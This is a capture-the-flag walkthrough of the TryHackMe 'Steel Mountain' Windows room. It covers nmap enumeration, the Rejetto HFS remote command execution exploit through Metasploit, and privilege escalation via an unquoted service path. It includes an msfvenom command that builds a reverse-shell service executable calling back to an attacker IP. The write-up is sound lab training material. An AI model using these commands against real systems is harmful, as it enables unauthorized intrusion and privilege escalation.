# **Description**

Hello hackers, I hope you are doing well. We are doing [Steel Mountain](https://tryhackme.com/room/steelmountain) from [TryHackMe](https://tryhackme.com). It's a windows machine running a vulnerable webserver, the vulnerability permits us to execute commands remotely, so we used an exploit to get a reverse shell. Once we're in the machine, we find a service with an unquoted service path, we create and exploit for that and use it to escalate our privileges. 

# **Enumeration**
## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```

We got plenty of open ports, and we can see it's a windows machine.

## Web

Let's navigate to the webserver on port 80.

![](/assets/img/tryhackme/steel/1.png)

Let's view the source code.

![](/assets/img/tryhackme/steel/2.png)

We got the name of the employee of the month, it's Bill Harper.

On the other webserver, we see that it's running `http file server 2.3`, let's see if there is any vulnerabilities in this version.

![](/assets/img/tryhackme/steel/3.png)

There is a remote command execution vulnerability.

# **Foothold**

## Metasploit

To get foothold using `metasploit`, we can use this exploit `exploit/windows/http/rejetto_hfs_exec`.

Launch metasploit by running `msfconsole`, and run `use exploit/windows/http/rejetto_hfs_exec`.

After that, we need to specify the RHOSTS, RPORT and LHOST.
 
 - RHOSTS: is the target machine's IP.
 - RPORT : is the port of the vulnerable web server (8080).
 - LHOST : is the attacker machine's IP, tun0.

## Exploit

To get foothold without metasploit, we can use exploits found in [Exploit-DB](https://www.exploit-db.com/) or other places..

In this example, I'll be using this [Exploit](https://github.com/NullByte007/Exploits/blob/master/Rejetto_HFS_2.3.X_RCE/HFS_RCE.py).

# **Privilege Escalation**

For this part, we're going to use the script suggested in the room; [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). We'll upload it using meterpreter, and load powershell in order to execute the script.

![](/assets/img/tryhackme/steel/6.png)

Now, we need to load the script with the command `. .\PowerUp.ps1` and the execute it with `Invoke-AllCheck`.

![](/assets/img/tryhackme/steel/7.png)

We can see that the `AdvancedSystemCareService9` service has an unquoted service path, we can restart it, and have write permissions on it's folder.

Let's create an executable that would sends us a shell once it's executed.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`

Then we need to upload the `Advanced.exe` file to the machine, and put it in the correct folder.

![](/assets/img/tryhackme/steel/8.png)


Next, we need to setup a multi handler listener to catch the reverse shell.

![](/assets/img/tryhackme/steel/9.png)

Now, we need to restart the `AdvancedSystemCareService9` service. To do that, we have to stop it with the command `sc stop AdvancedSystemCareService9` and start it with `sc start AdvancedSystemCareService9`. All that need to happen in a windows command shell, so type `shell` in meterpreter.

![](/assets/img/tryhackme/steel/10.png)

Now if we go to our multi handler listener, we should see a windows shell, and we have system privileges.
